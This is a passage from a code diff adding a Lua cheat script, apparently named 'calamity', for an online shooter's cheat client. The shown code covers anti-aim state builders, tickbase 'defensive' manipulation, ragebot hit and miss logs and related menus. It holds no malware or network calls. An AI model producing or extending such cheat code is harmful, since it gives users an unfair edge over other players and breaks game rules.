+            renderer.rectangle(x, y, w, thickness, r, g, b, a)
+            renderer.rectangle(x, y + h - thickness, w , thickness, r, g, b, a)
+    else
+        renderer.rectangle(x + radius, y, w - radius*2, thickness, r, g, b, a)
+        renderer.rectangle(x + radius, y + h - thickness, w - radius*2, thickness, r, g, b, a)
+        renderer.rectangle(x, y + radius, thickness, h - radius*2, r, g, b, a)
+        renderer.rectangle(x + w - thickness, y + radius, thickness, h - radius*2, r, g, b, a)
+        renderer.circle_outline(x + radius, y + radius, r, g, b, a, radius, 180, 0.25, thickness)
+        renderer.circle_outline(x + radius, y + h - radius, r, g, b, a, radius, 90, 0.25, thickness)
+        renderer.circle_outline(x + w - radius, y + radius, r, g, b, a, radius, -90, 0.25, thickness)
+        renderer.circle_outline(x + w - radius, y + h - radius, r, g, b, a, radius, 0, 0.25, thickness)
+    end
+end
+
+renderer.glow_module = function(x, y, w, h, width, rounding, accent, accent_inner)
+    local thickness = 1
+    local offset = 1
+    local r, g, b, a = unpack(accent)
+    if accent_inner then
+        renderer.rec(x , y, w, h + 1, rounding, accent_inner)
+    end
+    for k = 0, width do
+        if a * (k/width)^(1) > 5 then
+            local accent = {r, g, b, a * (k/width)^(2)}
+            renderer.rec_outline(x + (k - width - offset)*thickness, y + (k - width - offset) * thickness, w - (k - width - offset)*thickness*2, h + 1 - (k - width - offset)*thickness*2, rounding + thickness * (width - k + offset), thickness, accent)
+        end
+    end
+end
+
+local lua_group = pui.group("aa", "anti-aimbot angles")
+local fakelag_group = pui.group("aa", "Fake lag")
+local other_group = pui.group("aa", "Other")
+
+local antiaim_cond = { 'Global', 'Stand', 'Walking', 'Running' , 'Air', 'Air Crouching', 'Crouch', 'Crouch Moving', 'Manual', 'Legit AA', 'Freestanding', 'Safe Head'}
+local short_cond = { 'G', 'S', 'W', 'R' ,'A', 'A+C', 'C', 'C+M', 'M', 'L', 'F', 'S+'}
+
+
+local lua_menu = {
+    main = {
+        tab = lua_group:combobox('calamity ~ Beta\v'..username, {"Anti-Aim", "Visuals", "Misc", "Config"}),
+    },
+    antiaim = {
+        tab = lua_group:combobox("Tab", {"Main", "Builder"}),
+        aa_override = lua_group:multiselect('AA Override', {'On Warmup', 'No Enemies Alive'}),
+        safe_head = lua_group:multiselect('Safe Head', {'Air+C Knife', 'Air+C Zeus', 'Air+C SMG', 'Height Difference'}),
+        height_difference = lua_group:slider('Height Difference', 0, 300, 200, true, '%'),
+        yaw_direction = lua_group:checkbox('Yaw Direction'),
+        fr_options = lua_group:multiselect('Options', {'Freestanding On Quick Peek', 'Freestanding Disablers', 'Disable Yaw Modifier', 'Fake Peek'}),
+        fr_disablers = lua_group:multiselect('Disablers', {'Walking', 'Crouch', 'Air'}),
+        edge_yaw = lua_group:hotkey('Edge Yaw'),
+        freestanding = lua_group:hotkey('Freestanding'),
+
+        manual_direction = lua_group:checkbox('Manual Direction'),
+        yaw_options = lua_group:multiselect('Direction Options', {'Disable Yaw Modifier', 'Fake Peek'}),
+        key_left = lua_group:hotkey('Left Manual'),
+        key_right = lua_group:hotkey('Right Manual'),
+        key_forward = lua_group:hotkey('Forward Manual'),
+        yaw_base = lua_group:combobox("Yaw Base", {"Local view", "At targets"}),
+        defensive_triggers = lua_group:multiselect('Force Defensive Triggers', {'Hittable', 'Reload'}),
+        defensive_condition = lua_group:multiselect('Conditions', {'Stand', 'Moving', 'Walking', 'Crouching', 'Air'}),
+
+        condition = lua_group:combobox('State', antiaim_cond),
+    },
+    visuals = {
+        cross_ind = lua_group:checkbox("Crosshair Indicators", {200, 200, 200}),
+        cross_ind_type = lua_group:combobox("Type", {'Default', 'Alternative'}),
+        cross_color = lua_group:checkbox("Indicator Color", {100, 100, 100}),
+        key_color = lua_group:checkbox("Keybinds Color", {255, 255, 255}),
+        defensive_window = lua_group:checkbox("Defensive Window", {255, 255, 255}),
+        defensive_window_type = lua_group:combobox("Defensive Type", {'Default', 'Modern'}),
+        velocity_window = lua_group:checkbox("Velocity Window", {255, 255, 255}),
+        velocity_window_type = lua_group:combobox("Velocity Type", {'Default', 'Modern'}),
+        ragebot_logs = lua_group:multiselect("Ragebot Logs", {'Console', 'Screen'}),
+        ragebot_logs_hit = lua_group:color_picker('Hit Color', 116, 189, 96, 255),
+        ragebot_logs_miss = lua_group:color_picker('Miss Color', 189, 99, 96, 255),
+    },
+    misc = {
+        antibackstab = lua_group:checkbox('Avoid Backstab'),
+        fast_ladder = lua_group:checkbox("Fast Ladder"),
+        console = lua_group:checkbox("Console Filter"),
+        third_person = lua_group:checkbox("Third Person Distance"),
+        third_person_value = lua_group:slider("Third Person Distance Value", 30, 200, 50),
+        aspectratio = lua_group:checkbox("Aspect Ratio"),
+        aspectratio_value = lua_group:slider("Aspect Ratio Value", 00, 200, 133),
+        airqs = lua_group:checkbox("In Air Scout AutoStop"),
+        airqsbind = lua_group:hotkey("In Air Scout AutoStop", true),
+        defensive_fix = lua_group:checkbox("Defensive Fix"),
+        unsafe_recharge = lua_group:checkbox("Unsafe Recharge In Air"),
+        unsafe_type = lua_group:combobox('Type', {'Default', 'Alternative'}),
+        predict = lua_group:checkbox("Predict"),
+    },
+    config = {
+        list = lua_group:listbox("\vConfigs", ""),
+        name = lua_group:textbox("\vConfig Name"),
+        create = lua_group:button("\vCreate", function() end),
+        load = lua_group:button("\vLoad", function() end),
+        save = lua_group:button("\vSave", function() end),
+        delete = lua_group:button("\vDelete", function() end),
+        import = lua_group:button("\vImport", function() end),
+        export = lua_group:button("\vExport", function() end),
+    }
+}
+
+local antiaim_system = {}
+
+local space = {"\n", "\n\n", "\n\n\n", "\n\n\n\n", "\n\n\n\n\n", "\n\n\n\n\n\n", "\n\n\n\n\n\n\n", "\n\n\n\n\n\n\n\n", '\n\n\n\n\n\n\n\n\n', '\n\n\n\n\n\n\n\n\n\n', '\n\n\n\n\n\n\n\n\n\n\n', '\n\n\n\n\n\n\n\n\n\n\n\n'}
+
+for i=1, #antiaim_cond do
+    antiaim_system[i] = {
+        enable = lua_group:checkbox('Enable '..antiaim_cond[i]..' State'),
+        label5 = lua_group:label(' '),
+        pitch = lua_group:combobox('Pitch '..space[i], {"Off", "Down", 'Random'}),
+        label6 = lua_group:label(' '),
+        yaw_offset = lua_group:slider('Yaw Offset'..space[i], -180, 180, 0, true, '°', 1),
+        yaw_override = lua_group:checkbox('L/R Yaw'..space[i]),
+        yaw_left = lua_group:slider('Yaw Left'..space[i], -180, 180, 0, true, '°', 1),
+        yaw_right = lua_group:slider('Yaw Right'..space[i], -180, 180, 0, true, '°', 1),
+        yaw_random = lua_group:slider('Randomization'..space[i], 0, 100, 0, true, '%', 1),
+        label1 = lua_group:label(' '),
+        mod_type = lua_group:combobox('Jitter Type'..space[i], {'Off', 'Offset', 'Center', 'Random', 'Skitter'}),
+        mod_dm = lua_group:slider('Jitter Amount'..space[i], -180, 180, 0, true, '°', 1),
+        mod_random = lua_group:slider(' Jitter Random'..space[i], 0, 100, 0, true, '%', 1),
+        label2 = lua_group:label(' '),
+        body_yaw_type = lua_group:combobox('Body Yaw'..space[i], {'Off', 'Opposite', 'Jitter', 'Static'}),
+        body_slider = lua_group:slider('Body Yaw Amount'..space[i], -180, 180, 0, true, '°', 1),
+        yaw_delay = lua_group:slider('Delay'..space[i], 1, 10, 1, true, 't', 1),
+        delay_random = lua_group:slider('Delay Randomize'..space[i], 1, 6, 1, true, 't', 1),
+        label3 = lua_group:label(' '),
+        force_def = lua_group:checkbox('Force Defensive'..space[i]),
+        peek_def = lua_group:checkbox('Better Defensive On \vPeek'..space[i]),
+        label4 = lua_group:label(' '),
+        defensive = lua_group:checkbox('Defensive Anti~Aim'..space[i]),
+        defensive_yaw = lua_group:combobox('Defensive Yaw'..space[i], {'Off', 'Offset', 'Spin', 'Side~Ways', 'Random', 'Flick'}),
+        yaw_value = lua_group:slider(' Yaw Value'..space[i], -180, 180, 0, true, '°', 1),
+        spin_offset = lua_group:slider(' Spin Offset'..space[i], 0, 360, 360, true, '°', 1),
+        spin_speed = lua_group:slider(' Spin Speed'..space[i], -50, 50, 10, true, '%', 0.1),
+        defensive_pitch = lua_group:combobox(' Defensive Pitch'..space[i], {'Off', 'Custom', 'Side~Ways', 'Random', 'Spin'}),
+        pitch_value = lua_group:slider(' Pitch Value'..space[i], -89, 89, 0, true, '°', 1),
+        pitch_speed = lua_group:slider(' Pitch Speed'..space[i], -44, 44, 0, true, '%', 0.1),
+        defensive_select = lua_group:multiselect(' Additions'..space[i], {'Jitter', 'Body Yaw'}),
+        def_mod_type = lua_group:combobox(' Jitter Type'..space[i], {'Off', 'Offset', 'Center', 'Random', 'Skitter'}),
+        def_mod_dm = lua_group:slider(' Jitter Amount'..space[i], -180, 180, 0, true, '°', 1),
+        def_mod_random = lua_group:slider(' Jitter Random'..space[i], 0, 100, 0, true, '%', 1),
+        def_body_yaw_type = lua_group:combobox('Body Yaw '..space[i], {'Off', 'Opposite', 'Jitter', 'Static'}),
+        def_body_slider = lua_group:slider(' Body Yaw Amount'..space[i], -180, 180, 0, true, '°', 1),
+    }
+end
+
+local aa_tab = {lua_menu.main.tab, "Anti-Aim"}
+local misc_tab = {lua_menu.main.tab, "Misc"}
+local visual_tab = {lua_menu.main.tab, "Visuals"}
+local config_tab = {lua_menu.main.tab, "Config"}
+local aa_builder = {lua_menu.antiaim.tab, "Builder"}
+local aa_main = {lua_menu.antiaim.tab, "Main"}
+
+lua_menu.antiaim.tab:depend(aa_tab)
+lua_menu.antiaim.aa_override:depend(aa_tab, aa_main)
+lua_menu.antiaim.safe_head:depend(aa_tab, aa_main)
+lua_menu.antiaim.height_difference:depend(aa_tab, aa_main, {lua_menu.antiaim.safe_head, 'Height Difference'})
+
+lua_menu.antiaim.yaw_direction:depend(aa_tab, aa_main)
+lua_menu.antiaim.edge_yaw:depend(aa_tab, aa_main, {lua_menu.antiaim.yaw_direction, true})
+lua_menu.antiaim.freestanding:depend(aa_tab, aa_main, {lua_menu.antiaim.yaw_direction, true})
+lua_menu.antiaim.fr_options:depend(aa_tab, aa_main, {lua_menu.antiaim.yaw_direction, true})
+lua_menu.antiaim.fr_disablers:depend(aa_tab, aa_main, {lua_menu.antiaim.yaw_direction, true}, {lua_menu.antiaim.fr_options, 'Freestanding Disablers'})
+lua_menu.antiaim.manual_direction:depend(aa_tab, aa_main)
+lua_menu.antiaim.yaw_options:depend(aa_tab, aa_main, {lua_menu.antiaim.manual_direction, true})
+lua_menu.antiaim.key_left:depend(aa_tab, aa_main, {lua_menu.antiaim.manual_direction, true})
+lua_menu.antiaim.key_right:depend(aa_tab, aa_main, {lua_menu.antiaim.manual_direction, true})
+lua_menu.antiaim.key_forward:depend(aa_tab, aa_main, {lua_menu.antiaim.manual_direction, true})
+
+lua_menu.antiaim.yaw_base:depend(aa_tab, aa_main)
+
+lua_menu.antiaim.defensive_triggers:depend(aa_tab, aa_main)
+lua_menu.antiaim.defensive_condition:depend(aa_tab, aa_main, {lua_menu.antiaim.defensive_triggers, function() return lua_menu.antiaim.defensive_triggers:get('Hittable') or lua_menu.antiaim.defensive_triggers:get('Reload') end})
+
+lua_menu.antiaim.condition:depend(aa_tab, aa_builder)
+
+--Visuals
+lua_menu.visuals.cross_ind:depend(visual_tab)
+lua_menu.visuals.cross_ind_type:depend(visual_tab, {lua_menu.visuals.cross_ind, true})
+lua_menu.visuals.cross_color:depend(visual_tab, {lua_menu.visuals.cross_ind, true})
+lua_menu.visuals.key_color:depend(visual_tab, {lua_menu.visuals.cross_ind, true})
+lua_menu.visuals.defensive_window:depend(visual_tab)
+lua_menu.visuals.defensive_window_type:depend(visual_tab, {lua_menu.visuals.defensive_window, true})
+lua_menu.visuals.velocity_window:depend(visual_tab)
+lua_menu.visuals.velocity_window_type:depend(visual_tab, {lua_menu.visuals.velocity_window, true})
+lua_menu.visuals.ragebot_logs:depend(visual_tab)
+lua_menu.visuals.ragebot_logs_hit:depend(visual_tab, {lua_menu.visuals.ragebot_logs, function() return lua_menu.visuals.ragebot_logs:get('Console') or lua_menu.visuals.ragebot_logs:get('Screen') end})
+lua_menu.visuals.ragebot_logs_miss:depend(visual_tab, {lua_menu.visuals.ragebot_logs, function() return lua_menu.visuals.ragebot_logs:get('Console') or lua_menu.visuals.ragebot_logs:get('Screen') end})
+
+--Misc
+lua_menu.misc.antibackstab:depend(misc_tab)
+lua_menu.misc.fast_ladder:depend(misc_tab)
+lua_menu.misc.console:depend(misc_tab)
+lua_menu.misc.third_person:depend(misc_tab)
+lua_menu.misc.third_person_value:depend(misc_tab, {lua_menu.misc.third_person, true})
+lua_menu.misc.aspectratio:depend(misc_tab)
+lua_menu.misc.aspectratio_value:depend(misc_tab, {lua_menu.misc.aspectratio, true})
+lua_menu.misc.airqs:depend(misc_tab)
+lua_menu.misc.airqsbind:depend(misc_tab)
+lua_menu.misc.defensive_fix:depend(misc_tab)
+lua_menu.misc.unsafe_recharge:depend(misc_tab)
+lua_menu.misc.unsafe_type:depend(misc_tab, {lua_menu.misc.unsafe_recharge, true})
+lua_menu.misc.predict:depend(misc_tab)
+
+
+lua_menu.config.list:depend(config_tab)
+lua_menu.config.name:depend(config_tab)
+lua_menu.config.create:depend(config_tab)
+lua_menu.config.load:depend(config_tab)
+lua_menu.config.save:depend(config_tab)
+lua_menu.config.delete:depend(config_tab)
+lua_menu.config.import:depend(config_tab)
+lua_menu.config.export:depend(config_tab)
+
+for i=1, #antiaim_cond do
+    local cond_check = {lua_menu.antiaim.condition, function() return (i ~= 1) end}
+    local tab_cond = {lua_menu.antiaim.condition, antiaim_cond[i]}
+    local cnd_en = {antiaim_system[i].enable, function() if (i == 1) then return true else return antiaim_system[i].enable:get() end end}
+    local aa_tab = {lua_menu.main.tab, "Anti-Aim"}
+    local jit_ch = {antiaim_system[i].mod_type, function() return antiaim_system[i].mod_type:get() ~= "Off" end}
+    local def_jit_ch = {antiaim_system[i].def_mod_type, function() return antiaim_system[i].def_mod_type:get() ~= "Off" end}
+    local def_ch = {antiaim_system[i].defensive, true}
+    local body_ch = {antiaim_system[i].body_yaw_type, function() return antiaim_system[i].body_yaw_type:get() == "Static"  end}
+    local def_body_ch = {antiaim_system[i].def_body_yaw_type, function() return antiaim_system[i].def_body_yaw_type:get() == "Static" end}
+    local delay_ch = {antiaim_system[i].yaw_type, "Slow"}
+    local yaw_ch = {antiaim_system[i].defensive_yaw, "Spin"}
+    local pitch_ch = {antiaim_system[i].defensive_pitch, function() return antiaim_system[i].defensive_pitch:get() == "Custom" or antiaim_system[i].defensive_pitch:get() == "Spin" end}
+    local is_jitter = {antiaim_system[i].defensive_select, 'Jitter'}
+    local is_bodyyaw = {antiaim_system[i].defensive_select, 'Body Yaw'}
+
+    antiaim_system[i].enable:depend(cond_check, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].pitch:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].yaw_override:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].yaw_offset:depend(cnd_en, tab_cond, aa_tab, aa_builder, {antiaim_system[i].yaw_override, false})
+    antiaim_system[i].yaw_left:depend(cnd_en, tab_cond, aa_tab, aa_builder, {antiaim_system[i].yaw_override, true})
+    antiaim_system[i].yaw_right:depend(cnd_en, tab_cond, aa_tab, aa_builder, {antiaim_system[i].yaw_override, true})
+    antiaim_system[i].yaw_random:depend(cnd_en, tab_cond, aa_tab, aa_builder, {antiaim_system[i].yaw_override, true})
+    antiaim_system[i].mod_type:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+
+    antiaim_system[i].mod_dm:depend(cnd_en, tab_cond, aa_tab, jit_ch, aa_builder)
+    antiaim_system[i].mod_random:depend(cnd_en, tab_cond, aa_tab, jit_ch, aa_builder)
+    antiaim_system[i].body_yaw_type:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].body_slider:depend(cnd_en, tab_cond, aa_tab, body_ch, aa_builder)
+    antiaim_system[i].yaw_delay:depend(cnd_en, tab_cond, aa_tab, aa_builder, {antiaim_system[i].body_yaw_type, function() return antiaim_system[i].body_yaw_type:get() == 'Jitter' end})
+    antiaim_system[i].delay_random:depend(cnd_en, tab_cond, aa_tab, aa_builder, {antiaim_system[i].body_yaw_type, function() return antiaim_system[i].body_yaw_type:get() == 'Jitter' end}, {antiaim_system[i].yaw_delay, function() return antiaim_system[i].yaw_delay:get() > 1 end})
+
+    antiaim_system[i].force_def:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].peek_def:depend(cnd_en, tab_cond, aa_tab, {antiaim_system[i].force_def, false}, aa_builder)
+    antiaim_system[i].defensive:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].defensive_yaw:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder)
+    antiaim_system[i].yaw_value:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder, {antiaim_system[i].defensive_yaw, function() return antiaim_system[i].defensive_yaw:get() ~= 'Off' and antiaim_system[i].defensive_yaw:get() ~= 'Spin' end})
+    antiaim_system[i].spin_offset:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder, {antiaim_system[i].defensive_yaw, function() return antiaim_system[i].defensive_yaw:get() == 'Spin' end})
+    antiaim_system[i].spin_speed:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder, {antiaim_system[i].defensive_yaw, function() return antiaim_system[i].defensive_yaw:get() == 'Spin' end})
+    antiaim_system[i].defensive_pitch:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder)
+    antiaim_system[i].pitch_value:depend(cnd_en, tab_cond, aa_tab, def_ch, pitch_ch, aa_builder)
+    antiaim_system[i].pitch_speed:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder, {antiaim_system[i].defensive_pitch, 'Spin'})
+    antiaim_system[i].defensive_select:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder)
+
+    antiaim_system[i].def_mod_type:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder, is_jitter)
+    antiaim_system[i].def_mod_dm:depend(cnd_en, tab_cond, aa_tab, def_ch, def_jit_ch, aa_builder, is_jitter)
+    antiaim_system[i].def_mod_random:depend(cnd_en, tab_cond, aa_tab, def_ch, def_jit_ch, aa_builder, is_jitter)
+    antiaim_system[i].def_body_yaw_type:depend(cnd_en, tab_cond, aa_tab, def_ch, aa_builder, is_bodyyaw)
+    antiaim_system[i].def_body_slider:depend(cnd_en, tab_cond, aa_tab, def_ch, def_body_ch, aa_builder, is_bodyyaw)
+    antiaim_system[i].label1:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].label2:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].label3:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].label4:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].label5:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+    antiaim_system[i].label6:depend(cnd_en, tab_cond, aa_tab, aa_builder)
+end
+
+
+local function hide_original_menu(state)
+    ui.set_visible(ref.enabled, state)
+    ui.set_visible(ref.pitch[1], state)
+    ui.set_visible(ref.pitch[2], state)
+    ui.set_visible(ref.yawbase, state)
+    ui.set_visible(ref.yaw[1], state)
+    ui.set_visible(ref.yaw[2], state)
+    ui.set_visible(ref.yawjitter[1], state)
+    ui.set_visible(ref.roll[1], state)
+    ui.set_visible(ref.yawjitter[2], state)
+    ui.set_visible(ref.bodyyaw[1], state)
+    ui.set_visible(ref.bodyyaw[2], state)
+    ui.set_visible(ref.fsbodyyaw, state)
+    ui.set_visible(ref.edgeyaw, state)
+    ui.set_visible(ref.freestand[1], state)
+    ui.set_visible(ref.freestand[2], state)
+end
+
+local function randomize_value(original_value, percent)
+    local min_range = original_value - (original_value * percent / 100)
+    local max_range = original_value + (original_value * percent / 100)
+    return math.random(min_range, max_range)
+end
+
+local breaker = {
+    defensive = 0,
+    defensive_check = 0,
+    cmd = 0,
+    tickbase = 0
+}
+
+client.set_event_callback("predict_command", function(cmd)
+    me = entity.get_local_player()
+    if not me or not entity.is_alive(me) then     
+        breaker.defensive = 0
+        breaker.defensive_check = 0
+        return
+    end
+    breaker.tickbase = entity.get_prop(entity.get_local_player(), "m_nTickBase")
+    breaker.defensive_check = math.max(breaker.tickbase, breaker.defensive_check)
+    breaker.cmd = 0
+    if math.abs(breaker.tickbase - breaker.defensive_check) > 64 then
+        breaker.defensive = 0
+        breaker.defensive_check = 0
+    end
+    if breaker.defensive_check > breaker.tickbase then          
+        breaker.defensive = math.abs(breaker.tickbase - breaker.defensive_check)
+    end
+    breaker.tickbase_check = globals.tickcount() > entity.get_prop(me, "m_nTickbase")
+end)
+
+function is_defensive_active(lp)
+    is_defensive = breaker.tickbase_check and breaker.defensive > 2 and breaker.defensive < 14
+    return is_defensive
+end
+
+local id = 1   
+local function player_state(cmd)
+    local lp = entity.get_local_player()
+    if lp == nil then return end
+
+    local vecvelocity = { entity.get_prop(lp, 'm_vecVelocity') }
+    local flags = entity.get_prop(lp, 'm_fFlags')
+    local velocity = math.sqrt(vecvelocity[1]^2+vecvelocity[2]^2)
+    local groundcheck = bit.band(flags, 1) == 1
+    local jumpcheck = bit.band(flags, 1) == 0 or cmd.in_jump == 1
+    local ducked = entity.get_prop(lp, 'm_flDuckAmount') > 0.7
+    local duckcheck = ducked or ui.get(ref.fakeduck)
+    local slowwalk_key = ui.get(ref.slow[1]) and ui.get(ref.slow[2])
+
+    if jumpcheck and duckcheck then return "Air+C"
+    elseif jumpcheck then return "Air"
+    elseif duckcheck and velocity > 10 then return "Duck-Moving"
+    elseif duckcheck and velocity < 10 then return "Duck"
+    elseif groundcheck and slowwalk_key and velocity > 10 then return "Walking"
+    elseif groundcheck and velocity > 5 then return "Moving"
+    elseif groundcheck and velocity < 5 then return "Stand"
+    else return "Global" end
+end
+
+local yaw_direction = 0
+local last_press_t_dir = 0
+local is_freestand = false
+local is_static = false
+
+local function run_direction(cmd)
+    local lp = entity.get_local_player()
+    if lp == nil then return end
+    local vecvelocity = { entity.get_prop(lp, 'm_vecVelocity') }
+    local flags = entity.get_prop(lp, 'm_fFlags')
+    local jumpcheck = bit.band(flags, 1) == 0 or cmd.in_jump == 1
+    local moving = math.sqrt(vecvelocity[1]^2+vecvelocity[2]^2) > 10
+    local ducked = entity.get_prop(lp, 'm_flDuckAmount') > 0.7
+    local duckcheck = ducked or ui.get(ref.fakeduck)
+
+    local is_walking = moving and ui.get(ref.slow[1]) and ui.get(ref.slow[2])
+    local is_crouching = duckcheck and not jumpcheck
+
+    local fr_disabler = lua_menu.antiaim.fr_options:get('Freestanding Disablers')
+
+    is_freestand = lua_menu.antiaim.yaw_direction:get() and lua_menu.antiaim.freestanding:get()
+
+    local is_quick_peek = ui.get(ref.quick_peek[1]) and ui.get(ref.quick_peek[2])
+
+    if (fr_disabler and lua_menu.antiaim.fr_disablers:get('Walking') and is_walking) or (fr_disabler and lua_menu.antiaim.fr_disablers:get('Crouch') and is_crouching) or (fr_disabler and lua_menu.antiaim.fr_disablers:get('Air') and jumpcheck) then
+        ui.set(ref.freestand[1], false)
+        ui.set(ref.freestand[2], lua_menu.antiaim.freestanding:get() and 'Always on' or 'On hotkey')
+        is_freestand = false
+    elseif is_quick_peek and lua_menu.antiaim.fr_options:get('Freestanding On Quick Peek') then
+        ui.set(ref.freestand[1], true)
+        ui.set(ref.freestand[2], 'Always on')
+        is_freestand = true
+    else
+        ui.set(ref.freestand[1], lua_menu.antiaim.yaw_direction:get())
+        ui.set(ref.freestand[2], lua_menu.antiaim.freestanding:get() and 'Always on' or 'On hotkey')
+    end
+
+    if yaw_direction ~= 0 then
+        ui.set(ref.freestand[1], false)
+        is_freestand = false
+    end
+
+    is_static = (lua_menu.antiaim.fr_options:get('Disable Yaw Modifier') and is_freestand) or (yaw_direction ~= 0 and lua_menu.antiaim.yaw_options:get('Disable Yaw Modifier'))
+
+    if lua_menu.antiaim.manual_direction:get() and lua_menu.antiaim.key_right:get() and last_press_t_dir + 0.2 < globals.curtime() then
+        yaw_direction = yaw_direction == 90 and 0 or 90
+        last_press_t_dir = globals.curtime()
+    elseif lua_menu.antiaim.manual_direction:get() and lua_menu.antiaim.key_left:get() and last_press_t_dir + 0.2 < globals.curtime() then
+        yaw_direction = yaw_direction == -90 and 0 or -90
+        last_press_t_dir = globals.curtime()
+    elseif lua_menu.antiaim.manual_direction:get() and lua_menu.antiaim.key_forward:get() and last_press_t_dir + 0.2 < globals.curtime() then
+        yaw_direction = yaw_direction == 180 and 0 or 180
+        last_press_t_dir = globals.curtime()
+    elseif last_press_t_dir > globals.curtime() then
+        last_press_t_dir = globals.curtime()
+    end
+end
+
+anti_knife_dist = function (x1, y1, z1, x2, y2, z2)
+    return math.sqrt((x2 - x1)^2 + (y2 - y1)^2 + (z2 - z1)^2)
+end
+
+local function is_vulnerable()
+    for _, v in ipairs(entity.get_players(true)) do
+        local flags = (entity.get_esp_data(v)).flags
+        if bit.band(flags, bit.lshift(1, 11)) ~= 0 then
+            return true
+        end
+    end
+    return false
+end
+
+local function legit_aa(cmd)
+    local in_use = cmd.in_use == 1
+    local in_bombsite = entity.get_prop(entity.get_local_player(), "m_bInBombZone") > 0
+    local nTeam = entity.get_prop(entity.get_local_player(), "m_iTeamNum")
+    lx,ly,lz = entity.get_origin(entity.get_local_player())
+    local from = vector(client.eye_position())
+	local to = from + vector():init_from_angles(client.camera_angles()) * 1024
+    local tr = trace.line(from, to, { skip = entity.get_local_player(), mask = "MASK_SHOT" })
+    local local_pos = vector(entity.get_origin(entity.get_local_player()))
+
+    if tr.fraction >= 1 then
+        tr.entindex = 0
+    end
+   
+   if entity.get_classname(tr.entindex) ~= "CWorld" and entity.get_classname(tr.entindex) ~= "CCSPlayer" and entity.get_classname(tr.entindex) ~= "CFuncBrush" and entity.get_classname(tr.entindex) ~= "CBaseButton" and entity.get_classname(tr.entindex) ~= "CDynamicProp" and entity.get_classname(tr.entindex) ~= "CPhysicsPropMultiplayer" and entity.get_classname(tr.entindex) ~= "CBaseEntity" and entity.get_classname(tr.entindex) ~= "CC4" then 
+      
+        local not_wepwep = vector(entity.get_origin(tr.entindex))
+
+        if entity.get_classname(tr.entindex) == "CPropDoorRotating" or (entity.get_classname(tr.entindex) == "CHostage" and nTeam == 3) then
+            
+            if local_pos:dist(not_wepwep) < 125 then
+
+                return false
+            end
+
+        elseif entity.get_classname(tr.entindex) ~= "CPropDoorRotating" and entity.get_classname(tr.entindex) ~= "CHostage" then
+
+            if local_pos:dist(not_wepwep) < 200 then
+                return false
+            end
+        end
+   end
+  
+    local bomb_table    = entity.get_all("CPlantedC4")
+    local bomb_planted  = #bomb_table > 0
+    local bomb_distance = 100
+
+    if bomb_planted then
+        local bomb_entity = bomb_table[#bomb_table]
+        local bomb_pos = vector(entity.get_origin(bomb_entity))
+        bomb_distance = local_pos:dist(bomb_pos)
+    end
+
+    local defusing = bomb_distance < 50 and nTeam == 3
+
+    if defusing then return false end
+
+    if in_use then
+        cmd.in_use = 0
+        return true
+    end
+    return false
+end
+
+local current_tickcount = 0
+local to_jitter = false
+local to_defensive = true
+local first_execution = true
+local yaw_amount = 0
+local last_yaw = 0
+local not_def_yaw = 0
+local builder_items = nil
+local jit_amount = 0
+local safe_head = false
+
+local function defensive_peek()
+    to_defensive = false
+end
+
+local function defensive_disabler()
+    to_defensive = true
+end
+
+local function normalize_yaw(yaw)
+    return (yaw + 180) % 360 - 180
+end
+ 
+local function custom_spin(value, offset)
+    if offset == 0 then
+        return 0
+    end
+
+    if value >= 0 then
+        tick = globals.tickcount() * value
+        result = (tick % offset) - offset/2
+        return result
+    else
+        tick = globals.tickcount() * value
+        result = (tick % -offset) + offset/2
+        return result
+    end
+end
+
+local alive_players = {}
+
+aa_setup = function(cmd)
+    local lp = entity.get_local_player()
+    if lp == nil then return end
+    builder_items = antiaim_system[id]
+    if antiaim_system[12].enable:get() and safe_head then id = 12
+    elseif antiaim_system[11].enable:get() and is_freestand then id = 11
+    elseif antiaim_system[10].enable:get() and cmd.in_use == 1 then id = 10
+    elseif antiaim_system[9].enable:get() and yaw_direction ~= 0 then id = 9
+    elseif player_state(cmd) == "Duck-Moving" and antiaim_system[8].enable:get() then id = 8
+    elseif player_state(cmd) == "Duck" and antiaim_system[7].enable:get() then id = 7
+    elseif player_state(cmd) == "Air+C" and antiaim_system[6].enable:get() then id = 6
+    elseif player_state(cmd) == "Air" and antiaim_system[5].enable:get() then id = 5
+    elseif player_state(cmd) == "Moving" and antiaim_system[4].enable:get() then id = 4
+    elseif player_state(cmd) == "Walking" and antiaim_system[3].enable:get() then id = 3
+    elseif player_state(cmd) == "Stand" and antiaim_system[2].enable:get() then id = 2
+    else id = 1 end
+
+    if id == 10 then
+        legit_aa(cmd)
+    end
+
+    safe_head = false
+
+    ui.set(ref.roll[1], 0)
+
+    run_direction(cmd)
+
+    if globals.tickcount() > current_tickcount + builder_items.yaw_delay:get() + math.random(0, builder_items.delay_random:get()) then
+        if cmd.chokedcommands == 0 then
+            to_jitter = not to_jitter
+            current_tickcount = globals.tickcount()
+        end
+    elseif globals.tickcount() <  current_tickcount then
+        current_tickcount = globals.tickcount()
+    end
+
+    if is_vulnerable() then
+        if first_execution then
+            first_execution = false
+            to_defensive = true
+            client.set_event_callback("setup_command", defensive_disabler)
+        end
+        if globals.tickcount() % 10 == 9 then
+            defensive_peek()
+            client.unset_event_callback("setup_command", defensive_disabler)
+        end
+    else
+        first_execution = true
+        to_defensive = false
+    end
+
+    ui.set(ref.fsbodyyaw, false)
+    
+
